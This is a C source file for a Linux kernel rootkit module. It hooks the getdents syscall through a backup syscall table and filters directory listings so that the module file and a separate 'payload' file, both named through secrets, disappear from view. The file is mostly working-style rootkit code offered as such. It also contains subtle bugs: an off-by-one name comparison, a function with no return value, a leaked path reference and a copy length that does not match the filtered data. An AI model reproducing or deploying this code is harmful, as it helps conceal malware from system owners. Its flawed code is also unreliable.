#include "include.h"
#include "rw.h"
#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/fdtable.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/path.h>
#include "syscall.h"
#include "utility.h"
#include "secrets.h"
MODULE_LICENSE("GPL");

void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
	int i;
	struct linux_dirent64* dirent;
	char* tempbuf;
	int tempnread;
	i = 0;
	tempbuf = kmalloc(BUF_SIZE, GFP_KERNEL);
	tempnread = 0;

	while (i < *nread) {
		dirent = (struct linux_dirent64*) (buf + i);
		if (!strcmp(dirent->d_name-1, name)) {

		}
		else {
			memcpy(tempbuf + tempnread, dirent, dirent->d_reclen);
			tempnread += dirent->d_reclen;
		}
		i += dirent->d_reclen;
	}
	memcpy(buf, tempbuf, *nread);
	*nread = tempnread;
	kfree(tempbuf);
}

int get_path_via_fd(int fd, char* buf, int buf_size)
{
	char *tmp;
	char *pathname;
	struct file *file;
	struct path *path;
	
	struct files_struct* files = current->files;
	spin_lock(&files->file_lock);
	file = fcheck_files(files, fd);
	if (!file) {
		spin_unlock(&files->file_lock);
		return -ENOENT;
	}

	path = &file->f_path;
	path_get(path);
	spin_unlock(&files->file_lock);
	
	tmp = (char *)__get_free_page(GFP_TEMPORARY);

	pathname = d_path(path, tmp, PAGE_SIZE);

	// Copy to buf.
	strncpy(buf, pathname, buf_size);
	buf[buf_size-1] = 0;

	free_page((unsigned long)tmp);
}

/*char get_path_section(char* path, char buf)
{
	char* ptr = strlen(path);
}

char get_file_section(char* path)
{
	char* ptr = strlen();
	
}

void test_path_functions()
{
	
}*/

int getdentsShim(int fd, char* buf, int BUF_SIZE) {
	int nread;
	char filepath[255];	
 	get_path_via_fd(fd, filepath, sizeof(filepath));

	printk(KERN_INFO "filepath for fd %d: %s\n", fd, filepath); 

	nread = ((SYS_getdents_type)backup_sys_call_table[SYS_getdents])(fd, buf, BUF_SIZE);
	if (nread <= 0) {
		return nread;
	}
	hidename(buf, &nread, secret_ko_name, BUF_SIZE);
	hidename(buf, &nread, secret_payload_name, BUF_SIZE);
	return nread;
}
